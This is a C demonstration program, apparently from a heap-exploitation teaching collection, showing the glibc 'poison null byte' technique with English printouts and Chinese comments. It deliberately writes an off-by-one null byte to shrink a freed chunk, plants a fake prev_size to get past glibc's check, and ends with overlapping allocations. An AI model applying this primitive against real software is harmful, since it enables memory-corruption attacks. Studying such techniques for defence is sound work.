#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>


int main()
{
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	printf("Welcome to poison null byte 2.0!\n");
	printf("Tested in Ubuntu 16.04 64bit.\n");
	printf("This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n");
	printf("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");

	uint8_t* a;
	uint8_t* b;
	uint8_t* c;
	uint8_t* b1;
	uint8_t* b2;
	uint8_t* d;
	void *barrier;

	printf("We allocate 0x100 bytes for 'a'.\n");
	a = (uint8_t*) malloc(0x100);
	printf("a: %p\n", a);
	int real_a_size = malloc_usable_size(a);
	printf("Since we want to overflow 'a', we need to know the 'real' size of 'a' "
		"(it may be more than 0x100 because of rounding): %#x\n", real_a_size);

	/* chunk size attribute cannot have a least significant byte with a value of 0x00.
	 * the least significant byte of this will be 0x10, because the size of the chunk includes
	 * the amount requested plus some amount required for the metadata. */
	b = (uint8_t*) malloc(0x200);

	printf("b: %p\n", b);

	c = (uint8_t*) malloc(0x100);
	printf("c: %p\n", c);

	barrier =  malloc(0x100);
	printf("We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"
		"The barrier is not strictly necessary, but makes things less confusing\n", barrier);

	uint64_t* b_size_ptr = (uint64_t*)(b - 8);

	// added fix for size==prev_size(next_chunk) check in newer versions of glibc
	// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
	// this added check requires we are allowed to have null pointers in b (not just a c string)
	//*(size_t*)(b+0x1f0) = 0x200;
	printf("In newer versions of glibc we will need to have our updated size inside b itself to pass "
		"the check 'chunksize(P) != prev_size (next_chunk(P))'\n");
	// we set this location to 0x200 since 0x200 == (0x211 & 0xff00)
	// which is the value of b.size after its first byte has been overwritten with a NULL byte
	//* 提前修改chunkB size域改动后next_chunk(chunkB)处的prev_size
	*(size_t*)(b+0x1f0) = 0x200;

	// this technique works by overwriting the size metadata of a free chunk
	free(b);
	
	printf("b.size: %#lx\n", *b_size_ptr);
	printf("b.size is: (0x200 + 0x10) | prev_in_use\n");
	printf("We overflow 'a' with a single null byte into the metadata of 'b'\n");
	//模拟chunk a溢出一个null byte，淹没了chunk b的prev_inuse位
//! chunkB处于free状态时改动其size字段的最后1byte，减小chunk size
	//* 此时chunk位于unsorted bin中，更改size不会引发错误
	//* 结合之前构造的fake prev_size，完成了chunkB的缩小，便于后方利用
	//* 此时通过不同的方式访问chunkB会得到不同的结果
		//* 直接访问chunkB得到的size为0x200,且此时chunkB处于free状态，故所有基于chunkB的分配操作都是直接访问chunkB的
		//* 释放chunkC时，在前向合并流程中会通过prev_size字段访问chunkB，由于之前chunkB区域被人为修改，所有对chunkB
			//* 作出的操作都无法反映到chunkC的prev_size上，则通过chunkC访问的chunkB依然是原本的chunkB
	a[real_a_size] = 0; // <--- THIS IS THE "EXPLOITED BUG"
	printf("b.size: %#lx\n", *b_size_ptr);

	uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
	printf("c.prev_size is %#lx\n",*c_prev_size_ptr);

	// This malloc will result in a call to unlink on the chunk where b was.
	// The added check (commit id: 17f487b), if not properly handled as we did before,
	// will detect the heap corruption now.
	// The check is this: chunksize(P) != prev_size (next_chunk(P)) where
	// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)
	// next_chunk(P) == b-0x10+0x200 == b+0x1f0
	// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200
	printf("We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n",
		*((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
	//* 分配新chunk时，无法直接在相应的bin中找到，则先清理unsorted bin中的chunk到相应的bin中，chunkB对应的bin为其人为改动后的size对应的bin
	//* 无法通过best-fit原则找到对应chunk，通过bitmap找到chunkB，切割其前半部分
	b1 = malloc(0x100);

	printf("b1: %p\n",b1);
	printf("Now we malloc 'b1'. It will be placed where 'b' was. "
		"At this point c.prev_size should have been updated, but it was not: %#lx\n",*c_prev_size_ptr);
	printf("Interestingly, the updated value of c.prev_size has been written 0x10 bytes "
		"before c.prev_size: %lx\n",*(((uint64_t*)c)-4));
	printf("We malloc 'b2', our 'victim' chunk.\n");
	// Typically b2 (the victim) will be a structure with valuable pointers that we want to control
	
	//*再次切割chunkB 
	b2 = malloc(0x80);
	printf("b2: %p\n",b2);

	memset(b2,'B',0x80);
	printf("Current b2 content:\n%s\n",b2);

	printf("Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n");
	
	//* 此时chunkC的prev chunk仍然为紧接着chunkA后方的原chunkB开头处，此时此位置为b1
	//* 释放b1的情况下再释放C,此时b1位于chunkC - chunkC->prev_size处
	//* 绕过对C进行前向合并时对前方chunk的检测 : chunk->bk->fd == chunk && chunk->fd->bk == chunk
	//* glibc 2.23版本中不存在size & prev_size对应检测,此检测在glibc >= 2.26时生效
	free(b1);
	free(c);
	
	printf("Finally, we allocate 'd', overlapping 'b2'.\n");
	d = malloc(0x300);
	printf("d: %p\n",d);
	
	printf("Now 'd' and 'b2' overlap.\n");
	memset(d,'D',0x300);

	printf("New b2 content:\n%s\n",b2);

	printf("Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks"
		"for the clear explanation of this technique.\n");

	assert(strstr(b2, "DDDDDDDDDDDD"));
}
